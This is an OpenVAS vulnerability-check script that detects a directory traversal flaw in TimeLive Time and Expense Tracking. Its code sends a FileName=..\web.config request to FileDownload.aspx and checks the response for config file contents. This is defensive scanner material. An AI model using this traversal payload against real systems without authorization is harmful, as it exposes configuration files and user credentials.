###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_timelive_time_and_expense_tracking_mult_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# TimeLive Time and Expense Tracking Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to download the complete
  database of users information including email addresses, usernames and
  passwords and associated timesheet and expense data.
  Impact Level: Application";
tag_affected = "TimeLive Time and Expense Tracking version 4.2.1 and prior.";
tag_insight = "Multiple flaws are due to an error in 'FileDownload.aspx', when
  processing the 'FileName' parameter.";
tag_solution = "No solution or patch is available as of 29th September, 2011. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://www.livetecs.com";
tag_summary = "The host is running TimeLive Time and Expense Tracking and is prone
  to multiple vulnerabilities.";

if(description)
{
  script_id(902481);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-30 15:58:03 +0200 (Fri, 30 Sep 2011)");
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("TimeLive Time and Expense Tracking Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17900/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/105363/timelivetet-traversaldisclose.txt");
  script_xref(name : "URL" , value : "http://securityswebblog.blogspot.com/2011/09/timelive-time-and-expense-tracking-411.html");

  script_description(desc);
  script_summary("Check for the Information disclosure vulnerability in TimeLive");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("General");
  script_dependencies("secpod_timelive_time_n_expense_tracking_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

## Get Tembria Server Monitor Port
tlPort = get_http_port(default:80);
if(!tlPort){
  exit(0);
}

## Get the installed path
if(!dir = get_dir_from_kb(port:tlPort, app:"TimeLive")){
  exit(0);
}

## Construct the attack string
sndReq = http_get(item:string(dir, "/Shared/FileDownload.aspx?FileName" +
                  "=..\web.config"), port:tlPort);
rcvRes = http_send_recv(port:tlPort, data:sndReq);

## Confirm the exploit
if('All Events' >< rcvRes && 'Logging Application Block' >< rcvRes){
  security_hole(tlPort);
}
